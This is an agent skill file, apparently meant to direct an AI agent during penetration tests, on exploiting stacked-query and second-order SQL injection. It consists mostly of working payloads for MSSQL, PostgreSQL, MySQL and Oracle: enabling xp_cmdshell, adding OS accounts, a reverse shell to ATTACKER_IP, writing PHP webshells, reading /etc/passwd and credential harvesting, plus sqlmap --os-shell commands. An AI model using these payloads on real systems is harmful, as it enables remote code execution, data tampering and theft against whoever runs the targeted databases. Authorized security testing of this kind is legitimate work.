---
name: sql-injection-stacked
description: >
  Guide stacked query SQL injection and second-order injection exploitation
  during authorized penetration testing.
keywords:
  - stacked queries
  - multi-statement injection
  - xp_cmdshell
  - COPY TO PROGRAM
  - command execution via SQL
  - second-order SQLi
  - stored injection
  - data modification via SQLi
  - write webshell SQL
  - OS command from database
tools:
  - sqlmap
  - burpsuite
opsec: high
---

# Stacked Queries & Second-Order SQL Injection

You are helping a penetration tester exploit stacked query SQL injection
(executing multiple SQL statements via semicolons) and second-order injection
(stored payloads that trigger in a different query context). These are the
gateway to data manipulation, command execution, and file operations. All
testing is under explicit written authorization.

## Engagement Logging

Check for `./engagement/` directory. If absent, proceed without logging.

When an engagement directory exists:
- Print `[sql-injection-stacked] Activated → <target>` to the screen on activation.
- **Evidence** → save significant output to `engagement/evidence/` with
  descriptive filenames (e.g., `sqli-users-dump.txt`, `ssrf-aws-creds.json`).

## State Management

Call `get_state_summary()` from the state-reader MCP server to read current
engagement state. Use it to:
- Skip re-testing targets, parameters, or vulns already confirmed
- Leverage existing credentials or access for this technique
- Understand what's been tried and failed (check Blocked section)

Your return summary must include:
- New targets/hosts discovered (with ports and services)
- New credentials or tokens found
- Access gained or changed (user, privilege level, method)
- Vulnerabilities confirmed (with status and severity)
- Pivot paths identified (what leads where)
- Blocked items (what failed and why, whether retryable)

## Prerequisites

- Confirmed SQL injection point (see **web-discovery**)
- For stacked queries: DB and driver that supports multi-statement execution
- For second-order: ability to store input that is later used unsafely

### Database Support Matrix

| Feature | MSSQL | PostgreSQL | MySQL | Oracle | SQLite |
|---------|-------|------------|-------|--------|--------|
| Stacked queries (`;`) | Yes | Yes | No (default) | Limited | No |
| Command execution | xp_cmdshell | COPY TO PROGRAM | UDF / INTO OUTFILE | Java / DBMS_SCHEDULER | No |
| WAF bypass stacking | Yes (no `;` needed) | Limited | PREPARE/EXECUTE | N/A | N/A |

**MySQL caveat:** Stacking only works with `mysqli.multi_query()` or
`PDO::ATTR_EMULATE_PREPARES => true`.

## Step 1: Assess

If not already provided, determine:
1. **Injection point** — URL, parameter name, request method
2. **DBMS** — critical for selecting the right stacking technique
3. **Current DB privileges** — sysadmin/superuser enables command execution

Skip if context was already provided.

## Step 2: Confirm Stacking Support

```sql
-- No-op stacked query — no error means stacking is supported
'; SELECT 1--+

-- Time-based confirmation
'; WAITFOR DELAY '0:0:3'--+          -- MSSQL
'; SELECT pg_sleep(3)--+             -- PostgreSQL
```

If `;` causes an error but other injection works, stacking is not supported — use read-only techniques instead.

## Step 3: Exploit — Stacked Queries

### MSSQL

MSSQL has the richest stacking support. Semicolons are optional.

**Data manipulation:**
```sql
'; INSERT INTO users (username, password, role) VALUES ('hacker','Passw0rd!','admin')--+
'; UPDATE users SET password='Passw0rd!' WHERE username='admin'--+
```

**Enable and execute xp_cmdshell:**
```sql
-- Enable (disabled by default in SQL Server 2005+)
'; EXEC sp_configure 'show advanced options',1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell',1; RECONFIGURE--+

-- Execute OS commands
'; EXEC xp_cmdshell 'whoami'--+
'; EXEC xp_cmdshell 'net user hacker Passw0rd! /add'--+
'; EXEC xp_cmdshell 'powershell -e JABjAGwAaQBl...'--+
```

**WAF bypass — stacking without semicolons:**
```sql
admin'exec('update[users]set[password]=''a''')--
admin'exec('sp_configure''show advanced option'',''1''reconfigure')exec('sp_configure''xp_cmdshell'',''1''reconfigure')--
```

**OLE Automation** (alternative to xp_cmdshell):
```sql
'; DECLARE @s INT; EXEC sp_oacreate 'wscript.shell',@s OUT; EXEC sp_oamethod @s,'run',NULL,'cmd /c whoami > C:\temp\out.txt'--+
```

### PostgreSQL

Full stacking support via semicolons.

**Data manipulation:**
```sql
'; INSERT INTO users (username, password) VALUES ('hacker','Passw0rd!')--+
'; UPDATE users SET password='Passw0rd!' WHERE username='admin'--+
'; CREATE TABLE exfil (data text)--+
```

**Command execution via COPY TO PROGRAM** (requires superuser or `pg_execute_server_program`):
```sql
'; COPY (SELECT '') TO PROGRAM 'id > /tmp/out.txt'--+
'; COPY (SELECT '') TO PROGRAM 'bash -c "bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1"'--+
```

**Command execution via custom function (libc):**
```sql
'; CREATE OR REPLACE FUNCTION system(cstring) RETURNS int AS '/lib/x86_64-linux-gnu/libc.so.6','system' LANGUAGE 'c' STRICT--+
'; SELECT system('id')--+
```

**File operations:**
```sql
'; CREATE TABLE fileread (content text); COPY fileread FROM '/etc/passwd'--+
'; COPY (SELECT '<?php system($_GET["c"]); ?>') TO '/var/www/html/cmd.php'--+
```

### MySQL (When Stacking Is Possible)

**PREPARE/EXECUTE workaround** (bypasses keyword filters):
```sql
0); SET @query = 0x53454c45435420534c454550283529; PREPARE stmt FROM @query; EXECUTE stmt; #
-- 0x53454c45435420534c454550283529 = "SELECT SLEEP(5)"
```

**INSERT with ON DUPLICATE KEY UPDATE** (no stacking required):
```sql
-- Injected into INSERT VALUES clause:
attacker@evil.com"), ("admin@target.com","Passw0rd!") ON DUPLICATE KEY UPDATE password="Passw0rd!" #
```

**File write** (no stacking required):
```sql
' UNION SELECT '<?php system($_GET["cmd"]); ?>' INTO OUTFILE '/var/www/html/shell.php'--+
```

### Oracle

Limited stacking — primarily PL/SQL blocks.

**Command execution via DBMS_SCHEDULER:**
```sql
'; BEGIN DBMS_SCHEDULER.CREATE_JOB(job_name=>'pwn',job_type=>'EXECUTABLE',job_action=>'/bin/bash',number_of_arguments=>2,enabled=>FALSE); DBMS_SCHEDULER.SET_JOB_ARGUMENT_VALUE('pwn',1,'-c'); DBMS_SCHEDULER.SET_JOB_ARGUMENT_VALUE('pwn',2,'id > /tmp/out.txt'); DBMS_SCHEDULER.ENABLE('pwn'); END;--+
```

**Command execution via Java:**
```sql
'; SELECT DBMS_JAVA_TEST.FUNCALL('oracle/aurora/util/Wrapper','main','/bin/bash','-c','id > /tmp/out.txt') FROM dual--+
```

## Step 4: Exploit — Second-Order Injection

Second-order SQLi occurs when input is stored safely (escaped on INSERT) but
used unsafely in a later query.

### Attack Flow

```
1. STORE: Register with username = admin'--
   -> INSERT INTO users (username) VALUES ('admin''--')  <- properly escaped

2. TRIGGER: App reads stored value into a different query:
   -> query = "SELECT * FROM orders WHERE username = '" + user_from_db + "'"
   -> SELECT * FROM orders WHERE username = 'admin'--'   <- injection fires
```

### Common Vectors

| Store Location | Trigger Location |
|---|---|
| Registration username/email | Profile page, admin user list, password reset |
| Forum post / comment | Notification email, search index, RSS feed |
| File upload filename | File listing page, download handler |
| Address / shipping info | Invoice generation, CSV/PDF export |

### Testing Methodology

1. **Identify store points** — any form where input is saved
2. **Inject markers**: `admin'--`, `admin' OR '1'='1`, `admin' UNION SELECT 1,2,3--`
3. **Map trigger points** — navigate to every page that reads stored data
4. **Monitor for anomalies** — SQL errors, missing content, extra results
5. **Confirm with targeted payload** — craft extraction payload for the trigger context

### sqlmap for Second-Order

```bash
sqlmap -r register.txt -p username --second-url "http://TARGET/profile.php"
sqlmap -r register.txt -p username --second-req profile-request.txt
```

## Step 5: Post-Exploitation

1. **Enumerate privileges** — confirm DBA/superuser before command execution
2. **Command execution** — use DBMS-appropriate method (see Step 3)
3. **File operations** — read configs, write webshells
4. **Data manipulation** — insert admin users, modify application state
5. **Credential harvest** — database config files may contain creds for other systems

## Step 6: Escalate or Pivot

## OPSEC Notes

- **High risk**: Stacked queries modify data and trigger DBA alerts
- **Cleanup is critical** — revert data changes, drop created objects, disable re-enabled features:
  ```sql
  EXEC sp_configure 'xp_cmdshell', 0; RECONFIGURE;
  EXEC sp_configure 'show advanced options', 0; RECONFIGURE;
  ```
- Document exact changes (table, column, old value, new value) for restoration
- xp_cmdshell, sp_configure, COPY TO PROGRAM all appear in audit logs
- New database objects created by the web app user are anomalous

## Troubleshooting

### Stacked Queries Fail on MySQL
MySQL blocks stacking by default. Alternatives:
- `ON DUPLICATE KEY UPDATE` for INSERT injection (no stacking needed)
- `SELECT INTO OUTFILE` for file write (no stacking needed)
- Check if app uses `multi_query()` or PDO emulated prepares
- If none apply, stacking is not possible — use other techniques

### xp_cmdshell Access Denied
```sql
-- Check if sysadmin
SELECT IS_SRVROLEMEMBER('sysadmin')

-- Try impersonation
EXECUTE AS LOGIN = 'sa'; EXEC xp_cmdshell 'whoami'; REVERT;

-- Try OLE automation as alternative
EXEC sp_configure 'Ole Automation Procedures', 1; RECONFIGURE;
```

### COPY TO PROGRAM Permission Denied
```sql
-- Check if superuser
SELECT current_setting('is_superuser');

-- Check for pg_execute_server_program role (PostgreSQL 11+)
SELECT rolname FROM pg_roles WHERE pg_has_role(current_user, oid, 'member') AND rolname = 'pg_execute_server_program';

-- Alternative: write to web root
COPY (SELECT '<?php system($_GET["c"]); ?>') TO '/var/www/html/cmd.php';
```

### Second-Order Payload Not Triggering
- Stored value may be HTML-encoded, truncated, or transformed
- Try different quote contexts: `admin'--`, `admin"--`, `` admin`-- ``
- Check if trigger uses stored value directly or a derived value (e.g., user ID)
- Use Burp to intercept trigger request and inspect how stored value is embedded

### Automated Exploitation with sqlmap
```bash
# Stacked queries technique only
sqlmap -u "https://TARGET/page?id=1" --batch --technique=S --dbs

# OS shell (auto-selects xp_cmdshell or COPY TO PROGRAM)
sqlmap -u "https://TARGET/page?id=1" --batch --os-shell

# SQL shell for manual stacked execution
sqlmap -u "https://TARGET/page?id=1" --batch --sql-shell

# Second-order
sqlmap -r store-request.txt -p username --second-url "http://TARGET/trigger"
```
